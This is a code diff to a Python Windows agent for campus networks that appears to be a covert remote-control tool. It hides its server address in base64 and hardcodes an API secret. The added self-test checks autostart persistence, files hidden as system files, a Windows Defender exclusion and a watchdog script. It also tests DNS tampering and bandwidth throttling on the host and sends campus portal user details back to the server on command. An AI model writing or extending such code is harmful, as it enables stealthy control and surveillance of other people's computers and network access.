@@ -12,7 +12,7 @@ import urllib.request, urllib.parse, urllib.error
 _S = b'aHR0cHM6Ly95dWFuYWkuYmVzdC9neWs='  # https://yuanai.best/gyk
 DEFAULT_SERVER = base64.b64decode(_S).decode()
 PORTAL_IP = "10.228.9.7"
-AGENT_VERSION = "1.54"  # 版本号, 每次更新递增
+AGENT_VERSION = "1.55"  # 版本号, 每次更新递增
 # API 鉴权密钥 (服务器和客户端必须一致)
 API_SECRET = "CampusNet@2026#Secure"
 HEARTBEAT_INTERVAL = 5  # 心跳间隔(秒)
@@ -623,12 +623,15 @@ def set_bandwidth_limit(rate_kbps):
     rc, out, err = _ps_run(ps_all)
     if rc != 0 or 'VERIFY_OK' not in out:
         ok, admin_out = _ps_admin(ps_all)
+        out = admin_out  # 使用管理员执行的输出来验证
         results.append("admin✓" if ok else "admin✗")
     else:
         results.append("direct✓")
     
-    if 'VERIFY_OK' in out or 'VERIFY_OK' in str(results):
+    if 'VERIFY_OK' in str(out):
         results.append("QoS验证✓")
+    else:
+        results.append("QoS验证✗")
     
     # 保存状态
     try:
@@ -1433,6 +1436,477 @@ class CampusNet:
                 msg_parts += " | " + " ".join(details)
         return {"result": "success" if ok else "fail", "message": msg_parts}
 
+# ============ 设备自检系统 ============
+
+def _diag_ps(cmd_str, timeout=10):
+    """诊断用 PowerShell, 返回 (rc, stdout, stderr) 不抛异常"""
+    import subprocess
+    try:
+        r = subprocess.run(
+            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd_str],
+            capture_output=True, text=True, timeout=timeout,
+            creationflags=subprocess.CREATE_NO_WINDOW)
+        return r.returncode, r.stdout.strip(), r.stderr.strip()
+    except Exception as e:
+        return -1, "", str(e)
+
+def run_self_test(agent, S):
+    """全面设备自检, S 是 step reporter: S(step, total, msg, status)
+    返回 (success_count, fail_count, report_lines)
+    """
+    TOTAL = 30
+    ok_n = 0
+    fail_n = 0
+    report = []
+
+    def OK(step, msg):
+        nonlocal ok_n; ok_n += 1
+        report.append(f"✅ [{step}/{TOTAL}] {msg}")
+        S(step, TOTAL, f"✅ {msg}", "ok")
+
+    def FAIL(step, msg):
+        nonlocal fail_n; fail_n += 1
+        report.append(f"❌ [{step}/{TOTAL}] {msg}")
+        S(step, TOTAL, f"❌ {msg}", "error")
+
+    def INFO(step, msg):
+        report.append(f"ℹ️ [{step}/{TOTAL}] {msg}")
+        S(step, TOTAL, f"ℹ️ {msg}", "running")
+
+    is_win = platform.system() == "Windows"
+
+    # ===== Phase 1: 系统信息 =====
+    # Step 1: 基础系统信息
+    try:
+        os_ver = platform.platform()
+        arch = platform.machine()
+        py_ver = sys.version.split()[0]
+        frozen = "PyInstaller打包" if getattr(sys, 'frozen', False) else "Python脚本"
+        INFO(1, f"系统: {os_ver} | {arch} | Python {py_ver} | {frozen}")
+    except Exception as e:
+        FAIL(1, f"系统信息获取失败: {e}")
+
+    # Step 2: 主机 & 硬件
+    try:
+        hostname = socket.gethostname()
+        if is_win:
+            rc, cpu_out, _ = _diag_ps("(Get-CimInstance Win32_Processor).Name")
+            rc2, mem_out, _ = _diag_ps("[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)")
+            INFO(2, f"主机: {hostname} | CPU: {cpu_out or '?'} | RAM: {mem_out or '?'}GB")
+        else:
+            INFO(2, f"主机: {hostname} (非Windows, 跳过硬件详情)")
+    except Exception as e:
+        FAIL(2, f"主机信息失败: {e}")
+
+    # Step 3: Agent 安装信息
+    try:
+        exe_path = AGENT_EXE
+        exe_size = os.path.getsize(exe_path) if os.path.exists(exe_path) else 0
+        cfg_exists = os.path.exists(CONFIG_FILE)
+        INFO(3, f"EXE: {exe_path} ({exe_size/(1024*1024):.1f}MB) | 配置: {'✓' if cfg_exists else '✗'}")
+    except Exception as e:
+        FAIL(3, f"安装信息失败: {e}")
+
+    # Step 4: 网卡信息
+    try:
+        if is_win:
+            rc, adapters, _ = _diag_ps(
+                "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | "
+                "Select-Object Name,InterfaceDescription,MacAddress,LinkSpeed | "
+                "ForEach-Object { \"$($_.Name): $($_.LinkSpeed) $($_.MacAddress)\" }")
+            adapter_lines = adapters.strip().split('\n') if adapters.strip() else []
+            INFO(4, f"活动网卡 ({len(adapter_lines)}): {'; '.join(l.strip() for l in adapter_lines[:3])}")
+        else:
+            INFO(4, "非Windows, 跳过网卡检测")
+    except Exception as e:
+        FAIL(4, f"网卡信息失败: {e}")
+
+    # ===== Phase 2: 网络环境 =====
+    # Step 5: IP & MAC & 网关
+    try:
+        local_ip = get_local_ip()
+        mac = get_mac()
+        if is_win:
+            rc, gw, _ = _diag_ps(
+                "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' -EA SilentlyContinue | "
+                "Select-Object -First 1).NextHop")
+            INFO(5, f"IP: {local_ip} | MAC: {mac} | 网关: {gw or '?'}")
+        else:
+            INFO(5, f"IP: {local_ip} | MAC: {mac}")
+    except Exception as e:
+        FAIL(5, f"网络基础信息失败: {e}")
+
+    # Step 6: DNS 状态
+    try:
+        dns_hijacked, dns_servers = get_dns_status()
+        dns_blocked = os.path.exists(_DNS_BACKUP_FILE)
+        if dns_hijacked:
+            FAIL(6, f"DNS异常! 当前: {dns_servers} | DNS断网: {'是' if dns_blocked else '否'}")
+        else:
+            OK(6, f"DNS正常: {dns_servers or 'DHCP自动'} | DNS断网: {'是' if dns_blocked else '否'}")
+    except Exception as e:
+        FAIL(6, f"DNS检测失败: {e}")
+
+    # Step 7: 服务器连通性
+    try:
+        t0 = time.time()
+        r = http_post(f"{agent.server_url}/api/heartbeat", {
+            "agent_id": agent.agent_id, "hostname": agent.hostname,
+            "version": AGENT_VERSION, "platform": platform.system()
+        })
+        latency = int((time.time() - t0) * 1000)
+        if "error" not in r:
+            OK(7, f"服务器连通 ({agent.server_url}) 延迟: {latency}ms")
+        else:
+            FAIL(7, f"服务器响应异常: {r.get('error','?')} 延迟: {latency}ms")
+    except Exception as e:
+        FAIL(7, f"服务器不可达: {e}")
+
+    # Step 8: 外网连通性
+    try:
+        t0 = time.time()
+        urllib.request.urlopen("http://www.baidu.com", timeout=5)
+        latency = int((time.time() - t0) * 1000)
+        OK(8, f"外网连通 (baidu.com) 延迟: {latency}ms")
+    except Exception as e:
+        FAIL(8, f"外网不可达: {e}")
+
+    # ===== Phase 3: 校园网账户 =====
+    # Step 9: Portal 连通性
+    try:
+        t0 = time.time()
+        urllib.request.urlopen(f"http://{agent.net.portal_ip}/", timeout=5)
+        latency = int((time.time() - t0) * 1000)
+        OK(9, f"Portal连通 ({agent.net.portal_ip}) 延迟: {latency}ms")
+    except Exception as e:
+        FAIL(9, f"Portal不可达 ({agent.net.portal_ip}): {e}")
+
+    # Step 10: 用户认证状态
+    try:
+        online, campus_ip, ui, msg = agent.net.check_online()
+        if online and ui:
+            OK(10, f"已认证: {agent.net.username}({agent.net.user_id}) IP:{agent.net.user_ip} idx:{ui[:16]}...")
+        elif online:
+            INFO(10, f"网络可用但未获取userIndex: {msg}")
+        else:
+            FAIL(10, f"未认证/离线: {msg}")
+    except Exception as e:
+        FAIL(10, f"认证检测异常: {e}")
+
+    # Step 11: Portal API 测试
+    try:
+        import http.cookiejar
+        jar = http.cookiejar.CookieJar()
+        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
+        opener.open(f"http://{agent.net.portal_ip}/", timeout=5).read()
+        cookies = list(jar)
+        info_url = f"http://{agent.net.portal_ip}/eportal/InterFace.do?method=getOnlineUserInfo"
+        req = urllib.request.Request(info_url, data=b"userIndex=", method="POST")
+        req.add_header("Content-Type", "application/x-www-form-urlencoded")
+        with opener.open(req, timeout=5) as resp:
+            text = resp.read().decode("utf-8", errors="ignore")
+            info = json.loads(text)
+        has_session = any('JSESSIONID' in c.name for c in cookies)
+        ui = info.get("userIndex", "")
+        OK(11, f"Portal API正常 | JSESSIONID: {'✓' if has_session else '✗'} | userIndex: {'✓' if ui else '✗'} | 字段: {list(info.keys())[:6]}")
+    except Exception as e:
+        FAIL(11, f"Portal API异常: {e}")
+
+    # ===== Phase 4: 限速功能诊断 =====
+    # Step 12: PowerShell 环境
+    if is_win:
+        try:
+            rc, ps_ver, _ = _diag_ps("$PSVersionTable.PSVersion.ToString()")
+            if rc == 0 and ps_ver:
+                OK(12, f"PowerShell可用: v{ps_ver}")
+            else:
+                FAIL(12, f"PowerShell异常: rc={rc}")
+        except Exception as e:
+            FAIL(12, f"PowerShell不可用: {e}")
+    else:
+        INFO(12, "非Windows, 跳过PowerShell检测")
+
+    # Step 13: QoS 前置检查
+    if is_win:
+        try:
+            rc, qos_bind, _ = _diag_ps(
+                "Get-NetAdapterBinding -ComponentID ms_pacer -EA SilentlyContinue | "
+                "Select-Object Name,Enabled | ForEach-Object { \"$($_.Name):$($_.Enabled)\" }")
+            rc2, existing, _ = _diag_ps(
+                f'Get-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -PolicyStore ActiveStore -EA SilentlyContinue | '
+                'ForEach-Object { "$($_.Name) throttle=$($_.ThrottleRateAction)" }')
+            qos_lines = qos_bind.strip().split('\n') if qos_bind.strip() else []
+            enabled = sum(1 for l in qos_lines if 'True' in l)
+            INFO(13, f"QoS绑定: {enabled}/{len(qos_lines)}启用 | 现有策略: {existing or '无'}")
+        except Exception as e:
+            FAIL(13, f"QoS检查失败: {e}")
+    else:
+        INFO(13, "非Windows, 跳过QoS")
+
+    # Step 14: 限速设置测试 (设50KB/s → 验证 → 清除)
+    if is_win:
+        try:
+            INFO(14, "测试限速: 设置50KB/s...")
+            ok_bw, msg_bw = set_bandwidth_limit(50)
+            if ok_bw and 'QoS验证✓' in msg_bw:
+                OK(14, f"限速设置成功: {msg_bw}")
+            elif ok_bw:
+                FAIL(14, f"限速设置返回成功但验证失败: {msg_bw}")
+            else:
+                FAIL(14, f"限速设置失败: {msg_bw}")
+        except Exception as e:
+            FAIL(14, f"限速测试异常: {e}")
+    else:
+        INFO(14, "非Windows, 跳过限速测试")
+
+    # Step 15: 限速验证 & 清除
+    if is_win:
+        try:
+            # 验证策略确实存在
+            rc, verify_out, _ = _diag_ps(
+                f'$p = Get-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -PolicyStore ActiveStore -EA SilentlyContinue; '
+                'if($p){ "EXISTS throttle=$($p.ThrottleRateAction)" } else { "NOT_FOUND" }')
+            rc2, tcp_out, _ = _diag_ps('netsh interface tcp show global | Select-String "Receive Window"')
+            # 检查 GPO 注册表
+            rc3, gpo_out, _ = _diag_ps(
+                f'$q = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\QoS\\{BANDWIDTH_POLICY_NAME}"; '
+                'if(Test-Path $q){ $r = Get-ItemProperty $q; "GPO=$($r.\'Throttle Rate\')" } else { "GPO=无" }')
+            INFO(15, f"验证: {verify_out} | TCP: {tcp_out.strip()[:40]} | {gpo_out}")
+            # 清除
+            ok_clr, msg_clr = clear_bandwidth_limit()
+            if ok_clr:
+                OK(15, f"限速清除成功 | 验证: {verify_out} | {gpo_out}")
+            else:
+                FAIL(15, f"限速清除失败: {msg_clr}")
+        except Exception as e:
+            FAIL(15, f"限速验证/清除异常: {e}")
+    else:
+        INFO(15, "非Windows, 跳过")
+
+    # Step 16: 限速实际生效检测 (netsh + 策略复核)
+    if is_win:
+        try:
+            rc, after_qos, _ = _diag_ps(
+                f'Get-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -PolicyStore ActiveStore -EA SilentlyContinue')
+            rc2, after_tcp, _ = _diag_ps('(netsh interface tcp show global) -match "Receive Window"')
+            rc3, after_gpo, _ = _diag_ps(
+                f'Test-Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\QoS\\{BANDWIDTH_POLICY_NAME}"')
+            all_clean = (not after_qos.strip()) and ('normal' in after_tcp.lower() or 'Normal' in after_tcp) and ('False' in after_gpo)
+            if all_clean:
+                OK(16, f"限速清除验证: QoS策略=已删 | TCP窗口=正常 | GPO=已删")
+            else:
+                FAIL(16, f"限速残留! QoS:[{after_qos[:30]}] TCP:[{after_tcp.strip()[:30]}] GPO:[{after_gpo}]")
+        except Exception as e:
+            FAIL(16, f"限速清除验证异常: {e}")
+    else:
+        INFO(16, "非Windows, 跳过")
+
+    # ===== Phase 5: 下线功能诊断 =====
+    # Step 17: logout API 可达性 (不实际下线)
+    try:
+        if agent.net.user_index:
+            # 只测试 getOnlineUserInfo, 不实际 logout
+            url = f"http://{agent.net.portal_ip}/eportal/InterFace.do?method=getOnlineUserInfo"
+            text = agent.net._portal_post(url, {"userIndex": agent.net.user_index}, timeout=5)
+            info = json.loads(text)
+            if info.get("userIndex"):
+                OK(17, f"下线API可达: userIndex有效, userName={info.get('userName','?')}")
+            else:
+                FAIL(17, f"下线API异常: userIndex无效, 响应: {text[:80]}")
+        else:
+            FAIL(17, "无userIndex, 无法测试下线API (设备可能未认证)")
+    except Exception as e:
+        FAIL(17, f"下线API测试异常: {e}")
+
+    # Step 18: cancelMab API (只查不改)
+    try:
+        if agent.net.user_index:
+            url = f"http://{agent.net.portal_ip}/eportal/InterFace.do?method=getOnlineUserInfo"
+            text = agent.net._portal_post(url, {"userIndex": agent.net.user_index}, timeout=5)
+            info = json.loads(text)
+            fields = {k: str(v)[:30] for k, v in info.items() if v}
+            OK(18, f"Portal用户详情: {json.dumps(fields, ensure_ascii=False)[:120]}")
+        else:
+            INFO(18, "无userIndex, 跳过用户详情获取")
+    except Exception as e:
+        FAIL(18, f"用户详情获取异常: {e}")
+
+    # Step 19: Cookie/Session 机制验证
+    try:
+        import http.cookiejar
+        jar = http.cookiejar.CookieJar()
+        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
+        opener.open(f"http://{agent.net.portal_ip}/", timeout=5).read()
+        info_url = f"http://{agent.net.portal_ip}/eportal/InterFace.do?method=getOnlineUserInfo"
+        req = urllib.request.Request(info_url, data=b"userIndex=", method="POST")
+        req.add_header("Content-Type", "application/x-www-form-urlencoded")
+        with opener.open(req, timeout=5) as resp:
+            text1 = resp.read().decode("utf-8", errors="ignore")
+        info1 = json.loads(text1)
+        # 第二次不带cookie
+        req2 = urllib.request.Request(info_url, data=b"userIndex=", method="POST")
+        req2.add_header("Content-Type", "application/x-www-form-urlencoded")
+        with urllib.request.urlopen(req2, timeout=5) as resp2:
+            text2 = resp2.read().decode("utf-8", errors="ignore")
+        info2 = json.loads(text2)
+        idx1 = info1.get("userIndex", "")
+        idx2 = info2.get("userIndex", "")
+        if idx1 and not idx2:
+            OK(19, "Cookie机制正常: 有Cookie→有userIndex, 无Cookie→无userIndex")
+        elif idx1 and idx2:
+            INFO(19, f"Cookie机制: 两种方式都返回了userIndex (portal可能不依赖session)")
+        else:
+            FAIL(19, f"Cookie机制异常: 有Cookie→{bool(idx1)}, 无Cookie→{bool(idx2)}")
+    except Exception as e:
+        FAIL(19, f"Cookie机制测试异常: {e}")
+
+    # ===== Phase 6: DNS功能 =====
+    # Step 20: DNS 篡改测试
+    if is_win:
+        try:
+            INFO(20, "测试DNS篡改: 设为8.8.8.8 → 验证 → 恢复DHCP")
+            ok_dns, msg_dns = set_dns_hijack("8.8.8.8", "")
+            if ok_dns:
+                # 验证
+                rc, cur_dns, _ = _diag_ps(
+                    "Get-DnsClientServerAddress -AddressFamily IPv4 | "
+                    "Where-Object {$_.ServerAddresses} | "
+                    "Select-Object -First 1 -ExpandProperty ServerAddresses")
+                OK(20, f"DNS篡改成功: {msg_dns} | 当前DNS: {cur_dns[:40]}")
+            else:
+                FAIL(20, f"DNS篡改失败: {msg_dns}")
+        except Exception as e:
+            FAIL(20, f"DNS篡改测试异常: {e}")
+    else:
+        INFO(20, "非Windows, 跳过DNS测试")
+
+    # Step 21: DNS 恢复测试
+    if is_win:
+        try:
+            ok_rst, msg_rst = reset_dns()
+            if ok_rst:
+                rc, cur_dns, _ = _diag_ps(
+                    "Get-DnsClientServerAddress -AddressFamily IPv4 | "
+                    "Where-Object {$_.ServerAddresses} | "
+                    "Select-Object -First 1 -ExpandProperty ServerAddresses")
+                OK(21, f"DNS恢复成功: {msg_rst} | 当前DNS: {cur_dns[:40] or 'DHCP'}")
+            else:
+                FAIL(21, f"DNS恢复失败: {msg_rst}")
+        except Exception as e:
+            FAIL(21, f"DNS恢复测试异常: {e}")
+    else:
+        INFO(21, "非Windows, 跳过")
+
+    # ===== Phase 7: 安全/安装系统 =====
+    # Step 22: 开机自启状态
+    try:
+        reg = _reg_exists()
+        task = _task_exists()
+        lnk = _startup_lnk_exists()
+        overall = is_autostart_enabled()
+        status = f"注册表:{'✓' if reg else '✗'} 计划任务:{'✓' if task else '✗'} 启动夹:{'✓' if lnk else '✗'}"
+        if overall:
+            OK(22, f"开机自启已启用 | {status}")
+        else:
+            FAIL(22, f"开机自启未启用! | {status}")
+    except Exception as e:
+        FAIL(22, f"自启检测异常: {e}")
+
+    # Step 23: 文件保护状态
+    if is_win:
+        try:
+            import ctypes
+            attrs = ctypes.windll.kernel32.GetFileAttributesW(AGENT_EXE)
+            hidden = bool(attrs & 0x02) if attrs != -1 else False
+            system = bool(attrs & 0x04) if attrs != -1 else False
+            if hidden and system:
+                OK(23, f"文件保护已启用: hidden={hidden} system={system}")
+            else:
+                FAIL(23, f"文件保护不完整: hidden={hidden} system={system} attrs={attrs}")
+        except Exception as e:
+            FAIL(23, f"文件保护检测异常: {e}")
+    else:
+        INFO(23, "非Windows, 跳过文件保护")
+
+    # Step 24: Defender 排除状态
+    if is_win:
+        try:
+            rc, excl, _ = _diag_ps(
+                "(Get-MpPreference -EA SilentlyContinue).ExclusionPath -join '; '")
+            agent_dir = os.path.dirname(AGENT_EXE)
+            if agent_dir.lower() in excl.lower():
+                OK(24, f"Defender排除已设置: {excl[:80]}")
+            else:
+                FAIL(24, f"Defender排除未包含Agent目录! 排除列表: {excl[:80]}")
+        except Exception as e:
+            FAIL(24, f"Defender检测异常: {e}")
+    else:
+        INFO(24, "非Windows, 跳过Defender")
+
+    # Step 25: 看门狗状态
+    if is_win:
+        try:
+            watchdog_vbs = os.path.join(AGENT_DIR, "_watchdog.vbs")
+            watchdog_exists = os.path.exists(watchdog_vbs)
+            # 检查是否有 wscript 进程在跑
+            rc, procs, _ = _diag_ps(
+                "Get-Process wscript -EA SilentlyContinue | "
+                "Select-Object Id,StartTime | ForEach-Object { \"PID=$($_.Id)\" }")
+            if watchdog_exists and procs:
+                OK(25, f"看门狗运行中: {procs.strip()[:60]}")
+            elif watchdog_exists:
+                FAIL(25, f"看门狗脚本存在但进程未运行")
+            else:
+                FAIL(25, f"看门狗脚本不存在: {watchdog_vbs}")
+        except Exception as e:
+            FAIL(25, f"看门狗检测异常: {e}")
+    else:
+        INFO(25, "非Windows, 跳过看门狗")
+
+    # Step 26: Agent 进程权限检测
+    if is_win:
+        try:
+            rc, is_admin, _ = _diag_ps(
+                "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]"
+                "::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)")
+            rc2, user_out, _ = _diag_ps("[Environment]::UserName")
+            OK(26, f"运行身份: {user_out} | 管理员权限: {is_admin}")
+        except Exception as e:
+            FAIL(26, f"权限检测异常: {e}")
+    else:
+        INFO(26, "非Windows, 跳过权限检测")
+
+    # Step 27: 网速采样测试
+    try:
+        down, up = get_net_speed()
+        INFO(27, f"网速采样: ↓{down}KB/s ↑{up}KB/s (首次可能为0)")
+    except Exception as e:
+        FAIL(27, f"网速采样异常: {e}")
+
+    # Step 28: Agent 版本 & 更新通道
+    try:
+        INFO(28, f"Agent版本: v{AGENT_VERSION} | 服务器: {agent.server_url} | Agent ID: {agent.agent_id[:16]}...")
+    except Exception as e:
+        FAIL(28, f"版本信息异常: {e}")
+
+    # Step 29: 配置文件内容 (脱敏)
+    try:
+        cfg = load_config()
+        safe_keys = {k: ("***" if k in ("password",) else str(v)[:30]) for k, v in cfg.items()}
+        INFO(29, f"配置: {json.dumps(safe_keys, ensure_ascii=False)[:150]}")
+    except Exception as e:
+        FAIL(29, f"配置读取异常: {e}")
+
+    # Step 30: 总结
+    summary = f"自检完成: ✅{ok_n}项通过 ❌{fail_n}项失败 ℹ️{TOTAL-ok_n-fail_n}项信息"
+    if fail_n == 0:
+        OK(30, summary)
+    else:
+        FAIL(30, summary)
+
+    return ok_n, fail_n, report
+
+
 # ============ Agent 主类 ============
 
 class Agent:
@@ -1802,6 +2276,12 @@ class Agent:
                         })
                         time.sleep(1)
                         os._exit(0)
+
+            elif command == "self_test":
+                S(1, 30, "🔍 启动设备全面自检...")
+                ok_n, fail_n, report = run_self_test(self, S)
+                success = fail_n == 0
+                message = f"自检完成: ✅{ok_n}通过 ❌{fail_n}失败"
 
             elif command == "uninstall":
                 S(1, 4, "接收卸载指令")
